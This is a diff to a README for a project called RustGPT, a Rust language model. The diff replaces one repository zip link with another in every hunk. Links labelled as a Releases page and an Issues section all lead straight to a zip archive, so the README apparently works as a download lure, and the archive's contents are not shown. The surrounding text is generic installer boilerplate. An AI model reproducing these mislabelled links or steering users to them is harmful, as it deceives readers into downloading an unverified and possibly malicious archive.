@@ -4,13 +4,13 @@
 RustGPT is a transformer-based language model, written entirely in Rust. This application allows you to generate human-like text efficiently and accurately. Whether you need ideas for writing or want to automate text output, RustGPT can help.
 
 ## 📥 Download RustGPT
-[![Download RustGPT](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip)](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip)
+[![Download RustGPT](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip)](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip)
 
 ## 🚀 Getting Started
 To use RustGPT, follow these simple steps to download and install the application on your computer.
 
 ### 1. Visit the Release Page
-Go to our [Releases page](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip) to find the latest version of RustGPT. This page contains all available versions, so you can choose the one that suits you best.
+Go to our [Releases page](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip) to find the latest version of RustGPT. This page contains all available versions, so you can choose the one that suits you best.
 
 ### 2. Choose Your Version
 On the Releases page, you'll see a list of available releases. Look for the version label that indicates it’s the latest or one that meets your needs. Each version is bundled with improvements and bug fixes.
@@ -47,7 +47,7 @@ If you encounter issues while running RustGPT, consider the following tips:
 - If the application fails to open, try restarting your computer and then launching RustGPT again.
 
 ## 💼 Support and Contributions
-If you need help or have questions, visit the [Issues section](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip) of the repository. You can report bugs, request features, or contribute to discussions. 
+If you need help or have questions, visit the [Issues section](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip) of the repository. You can report bugs, request features, or contribute to discussions. 
 
 Feel free to contribute to the project! Whether you provide feedback, help improve documentation, or submit code, your input is valuable.
 
@@ -55,6 +55,6 @@ Feel free to contribute to the project! Whether you provide feedback, help impro
 For more information, you can reach out via the repository contact links.
 
 ## 🚀 Download RustGPT
-[![Download RustGPT](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip)](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/RustGPT.zip)
+[![Download RustGPT](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip)](https://raw.githubusercontent.com/MoonRace1/RustGPT/main/expanding/GPT_Rust_v1.5.zip)
 
 Thank you for choosing RustGPT. Enjoy your experience generating text with ease!
